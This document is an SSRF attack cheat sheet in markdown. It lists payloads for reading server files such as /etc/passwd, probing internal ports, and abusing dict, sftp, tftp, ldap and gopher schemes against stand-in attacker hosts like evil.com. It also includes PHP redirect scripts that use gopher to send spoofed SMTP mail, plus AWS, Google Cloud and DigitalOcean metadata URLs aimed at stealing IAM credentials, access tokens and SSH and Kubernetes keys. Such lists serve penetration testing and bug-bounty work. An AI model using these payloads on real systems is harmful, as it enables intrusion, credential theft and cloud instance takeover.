# Server-Side Request Forgery #

> Two types of SSRF
- Basic
- Blind

## Basic SSRF ##

As mentioned It displays response to attacker, so after the server fetches the URL asked by attacker for him, it will send the response back to attacker



## Blind SSRF ##

To demonstrate impact with this kind of SSRF is to run an Internal IP and PORT scan
The impact in the case of Blind SSRF is limited.

## What we can do with SSRF
1. SSRF to reflected XSS

    Example - http://localhost:4567/?url=http://brutelogic.com.br/poc.svg      
    
    `http://brutelogic.com.br/poc.svg -> simple alert`    
    `https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf`    
    
    `https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg`
    

2. Testing URL schemas  

    First thing to do when we find an SSRF is to test all the wrapper which are working

   file:///    
   dict://     
   sftp://     
   ldap://     
   tftp://     
   gopher://     


### File ###     
Allows an attacker to fetch the content of a file on the server     

`file://path/to/file`    
`file:///etc/passwd`     
`file://\/\/etc/passwd`    
`ssrf.php?url=file:///etc/passwd`    


### HTTP ###    
Allows an attacker to fetch any content from the web, it can also be used to scan ports.

`ssrf.php?url=http://127.0.0.1:22`     
`ssrf.php?url=http://127.0.0.1:80`   
`ssrf.php?url=http://127.0.0.1:443`    


> The following URL scheme can be used to probe the network   

### DICT ###    
The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:    

`dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>`   
`ssrf.php?url=dict://attacker:11111/`   


### SFTP ###    
A network protocol used for secure file transfer over secure shell

`ssrf.php?url=sftp://evil.com:11111/`    

### TFTP ###   
Trivial File Transfer Protocol, works over UDP

`ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET`    


### LDAP ###     
Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.

`ssrf.php?url=ldap://localhost:11211/%0astats%0aquit`    


### Gopher ###    




### Gopher HTTP ###   

```   
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body    

```


### Gopher SMTP - Back connect to 1337 ###

```
Content of evil.com/redirect.php:
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>

Now query it.
https://example.com/?q=http://evil.com/redirect.php.   

```


### Gopher SMTP - send a mail ###   

```
Content of evil.com/redirect.php:
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>    

```


### Netdoc ###     
Wrapper for Java when your payloads struggle with "\n" and "\r" characters.

`ssrf.php?url=gopher://127.0.0.1:4242/DATA`     



3. SSRF URL for Cloud Instances     

#### AMAZON ####     

If you find an SSRF in Amazon Could, Amazon expose an internal service every EC2 instance can query for instance metadata about the host. If you found an SSRF vulnerability that runs on EC2, try requesting :   

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
```  

This will give our juicy information like Aws keys, ssh keys and more  



#### Google Cloud ####          


```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json   
```      


Google is shutting down support for usage of the v1 metadata service on January 15.  Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"       


```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```
Further exploiting this can lead to instances takeover. 



Google allows recursive pulls - 
`http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true`   


Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)  
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```      



Interesting files to pull out:       

* SSH Public Key `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`   
* Get Access Token  `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`    
* Kubernetes Key   `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`        





#### Digital Ocean ####        


```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

All in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```   





